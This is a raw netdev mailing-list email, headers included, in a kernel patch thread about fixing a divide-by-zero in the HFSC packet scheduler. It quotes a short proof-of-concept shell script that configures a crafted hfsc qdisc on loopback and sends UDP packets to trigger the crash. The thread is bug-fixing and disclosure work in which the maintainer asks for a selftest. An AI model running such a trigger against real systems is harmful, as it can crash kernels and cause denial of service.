Return-Path: <netdev+bounces-272245-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id qD+yBuqbxWnP/wQAu9opvQ
	(envelope-from <netdev+bounces-272245-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 21:49:46 +0100
X-Original-To: lists+netdev@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [172.105.105.114])
	by mail.lfdr.de (Postfix) with ESMTPS id 854DF33B8F2
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 21:49:45 +0100 (CET)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id 5B72030786F4
	for <lists+netdev@lfdr.de>; Thu, 26 Mar 2026 20:44:57 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 7094B3A6EF7;
	Thu, 26 Mar 2026 20:44:49 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b="m3R+q4x7"
X-Original-To: netdev@vger.kernel.org
Received: from mail-pj1-f54.google.com (mail-pj1-f54.google.com [209.85.216.54])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 3B7C53A6EE2
	for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 20:44:48 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.216.54
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1774557889; cv=pass; b=Op1CZPImVTEL521OsRNSyNR73KoK+l2ACzy59E3l2GFIMtZttbDOoYGpFVF6S1U0QaGWCq9t1+ytRfCMwmTSfS7hDyFWedvPjiVhyrK2zch6GQlPBoBA1eiG5CwkVOJzWcMrhAHhbAzsIdGcR02HdA/JU6iR+NNn60x/JAqIBNQ=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1774557889; c=relaxed/simple;
	bh=6RU46qGrLkrG6LCEDpLTmbdBaVdxhmYHILUrHQsLDXI=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=I3+qGCgolTF/dhcpmGLZKFJfUbeIqNEQ+AxNag2nFNDbFoQKqnYcJ6cuVjAz14TG1/kDRun7ujYlGqoJsl/HoTnrHV6JiWzTtr73cKu1wKBCC5DHjXQcAUjIr4dfxUydPjse+oci7ruipAFuJyrFZ/whaqaFwafWU01qLHhjFRw=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu; spf=pass smtp.mailfrom=asu.edu; dkim=pass (2048-bit key) header.d=asu.edu header.i=@asu.edu header.b=m3R+q4x7; arc=pass smtp.client-ip=209.85.216.54
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=asu.edu
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=asu.edu
Received: by mail-pj1-f54.google.com with SMTP id 98e67ed59e1d1-35a1f549e7eso906335a91.0
        for <netdev@vger.kernel.org>; Thu, 26 Mar 2026 13:44:48 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1774557888; cv=none;
        d=google.com; s=arc-20240605;
        b=MYtm8eYERXBy15h0I1nHQxd0w4Q51vuyWK8ysUpV1R9hUX1TxnIVr/a9c4z6++hwIk
         8Mge5C2aJIBclbH1RKqNAS4ilmMApQwa/zgk2+Bz2c25f3/KfLp3V62U6rLu8ETcp5YU
         ncqvHMqf+uk2Q1oE0QL5TQgJxSK1ySkMT9MD7RHb/q5yzUi2cTFoVeSBf2rX6d7MWOec
         85cvGwvdp9R91LCt4A1nW2NdGIY7MRb9cGveAw0ZAzY6yHt7b+joYdSWckxVXos5jQ0H
         3d8EuXzrTAMW9pRBJ8Wz8P/2DcQRUTJbyQk2U7LeuOa/o172tftmDIit7DG1krWWTrSp
         Z4lA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=NQRpKosNgrUEF/qxS6GkdZ7w4bboAXXJ19JHIebiM/w=;
        fh=FQjwkTABzDdUldU2nQbo9jW4zYdAHpvK/5rS/6XTFzI=;
        b=W6rRurMtB6MfLYuywWI/pAQGGeIJhlFyMIt9uBCrTiIf4xw1MSlkjj7xiIQeAD8OGA
         rGMroclBGrU+BLYd4YrjC+Kbo+QNffeMntumRyG3tGZimGIIXdVgaOJOqY1kTM3pIKix
         kqKvzfLh6/Dfp518q0D4797I0kAJFSnVW9FI+QuOOjB7V6h534ue8njJkufw//Akud/A
         t6BMCi0Sfnh5Af+gzNGla+wv48BML9ewE0j9qyq6axH4eM6t6c1xy3Dgac3/ozGpqT11
         owlj9yI9sf6iGBbpyQILM/u5lw2hJ9Xr7hkJseBWxE3KGVoHLvdpcUHb2LeWyAuW1uUO
         T+eA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=asu.edu; s=google; t=1774557888; x=1775162688; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=NQRpKosNgrUEF/qxS6GkdZ7w4bboAXXJ19JHIebiM/w=;
        b=m3R+q4x7xil13kBZo/9P7gHojKRZM3iHOlq+4+xasQmrXNHU4czxByudzPmd4vCD20
         fZ2HzXgOMIUd3rJwDvd+dYF2zSDdO7qLM+5IC1eKUADKlo0ssjXaw80JRdaGLbXoBdSp
         nh9R2H9vKFCz+7xwfnU0g6y64zKlv4o4EoR4xfmKu/Sia8wAtNIDQJHTI2EUIt4h4Avd
         kS4ieC3AK/7KOHDL7v21hgxV6kzdp8rU4/HfeD4rwbH6pov2lXXsYWrxh488sIvAbNeJ
         31zj46dPPFH9AQ4FY5ptwjZj54NkWIUVpuXD3/2aHIWk7AOHPZfpyATRTYHFwqeDg6tc
         dovw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1774557888; x=1775162688;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=NQRpKosNgrUEF/qxS6GkdZ7w4bboAXXJ19JHIebiM/w=;
        b=Sun9Tta91xGVktoSJPF65SlYT31CQVr76EUwWEnZWEFLfbadJc//VzmAw++A6w33Ej
         J5ZAqlygs8T7PMdNxpc6lTJYuYUK2YOXxf0vwke4b1DW/+uysoZlYdMQaCmzKAZU8rX0
         +PbZraQMA4vh4CCCCK7RXfJvi/bPvx6PuABjaZaLtpY8zZsqz+srUNWztsvAwER6qFb5
         zYStN8VDBuAm94tcImTxgEcl9JrdNizXJtpxGklx4XS2Tm1MBq2DQiu8D3LX99194XkK
         U/oVmbxy/URa+NO6JJXG7lER1kV/gfSnSiAjV9sjtj6Ss2BC14Q6LKfYVRAGq1LTZB5x
         cGPg==
X-Forwarded-Encrypted: i=1; AJvYcCUcP16yvKdT6mel6Lu7lL1i9ndfDz9Y0fJgvhCbgEluc50VgujvDmR07V53tVYIueeYUlfpctk=@vger.kernel.org
X-Gm-Message-State: AOJu0YyV0zb1HBxjMFlMkS8YyOmQU9XhuQlm5MPse3dcFhe5kZLeown5
	+T7/f8EOUPxW5DNhCIN5u+H1Duvcd5fDDC9PEkqwTsQbn+KjV3knwUrtIZroT7hAhe+m4pWEdwe
	tApNXVKOlSJ7lMP3+MJsVUPnU4x9LYRcvodaOVlWE
X-Gm-Gg: ATEYQzw+QL/xT32ippmFrL8clbW3vblyd6E/vkAClzabDFaVC17OBdv5CcZ5UqNbBxS
	SEl/7YdHji5px3YrjokdaFZcds9Eiztn4cypl7Q7rnb+SKSVMxkdbviarghickx11UB98p6G/XR
	gBsapK6U1+8HNKASChiU/H9wCpWTcg8Ktex1XtNXHbyatabqR4rWutXwOnAk4xNqFqv90+73p7u
	SWHjbghqcIH3cIwaZvVsGV/pMa0a8nzGCSrdc0hh46MF9TPect2TtkOn+Fuwe22TuYUzoLtXv63
	5B9Z4xlY
X-Received: by 2002:a17:90b:224c:b0:35b:9682:51dd with SMTP id
 98e67ed59e1d1-35c0dd94a15mr8315570a91.24.1774557887676; Thu, 26 Mar 2026
 13:44:47 -0700 (PDT)
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260326075851.3967598-1-xmei5@asu.edu> <g5kyhh74rriqg4ayz5txfqqtxpuklzu4kbkmcwihqpvyv4xq2s@xcpvtqh7bh5g>
 <20260326122137.4aae1d46@kernel.org>
In-Reply-To: <20260326122137.4aae1d46@kernel.org>
From: Xiang Mei <xmei5@asu.edu>
Date: Thu, 26 Mar 2026 13:44:37 -0700
X-Gm-Features: AQROBzB4yKeS9-ZtvH8MpE9VXxF1jdJZA2TgK6l-17gpEmJUytPSu16Wvx5VnWg
Message-ID: <CAPpSM+Sz_z2LpJwJrc9g+A+vRb=dRyMaDnBdZPP7TT952bgjpg@mail.gmail.com>
Subject: Re: [PATCH net v2] net/sched: sch_hfsc: fix divide-by-zero in rtsc_min()
To: Jakub Kicinski <kuba@kernel.org>
Cc: security@kernel.org, netdev@vger.kernel.org, pabeni@redhat.com, 
	jhs@mojatatu.com, jiri@resnulli.us, davem@davemloft.net, edumazet@google.com, 
	horms@kernel.org, bestswngs@gmail.com
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[asu.edu,none];
	R_DKIM_ALLOW(-0.20)[asu.edu:s=google];
	R_SPF_ALLOW(-0.20)[+ip4:172.105.105.114:c];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[kernel.org,vger.kernel.org,redhat.com,mojatatu.com,resnulli.us,davemloft.net,google.com,gmail.com];
	TAGGED_FROM(0.00)[bounces-272245-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[asu.edu:+];
	MISSING_XM_UA(0.00)[];
	TO_DN_SOME(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[xmei5@asu.edu,netdev@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[netdev];
	RCPT_COUNT_SEVEN(0.00)[10];
	ASN(0.00)[asn:63949, ipnet:172.105.96.0/20, country:SG];
	DBL_BLOCKED_OPENRESOLVER(0.00)[tor.lore.kernel.org:helo,tor.lore.kernel.org:rdns,mail.gmail.com:mid,asu.edu:dkim]
X-Rspamd-Queue-Id: 854DF33B8F2
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

Thanks for the suggestion. A TDC selftest was added to v3.

On Thu, Mar 26, 2026 at 12:21=E2=80=AFPM Jakub Kicinski <kuba@kernel.org> w=
rote:
>
> On Thu, 26 Mar 2026 11:54:52 -0700 Xiang Mei wrote:
> > PoC:
> > ```sh
> > #!/bin/sh
> > ip link set lo up
> >
> > tc qdisc replace dev lo root handle 1: \
> >     stab overhead 3000000 mtu 0 tsize 0 \
> >     hfsc default 1
> > tc class replace dev lo parent 1: classid 1:1 hfsc \
> >     rt m1 32gbit d 1ms m2 0bit \
> >     ls m1 32gbit d 1ms m2 0bit
> >
> > # Send UDP to loopback (same method as C PoC)
> > python3 -c "
> > import socket,time
> > s=3Dsocket.socket(socket.AF_INET,socket.SOCK_DGRAM)
> > s.sendto(b'A'*64,('127.0.0.1',1337))  # activate class
> > time.sleep(1)                           # drain =E2=86=92 idle
> > s.sendto(b'A'*64,('127.0.0.1',1337))  # reactivation =E2=86=92 div-by-z=
ero
> > "
> > ```
>
> Please turn this into a TDC selftest.

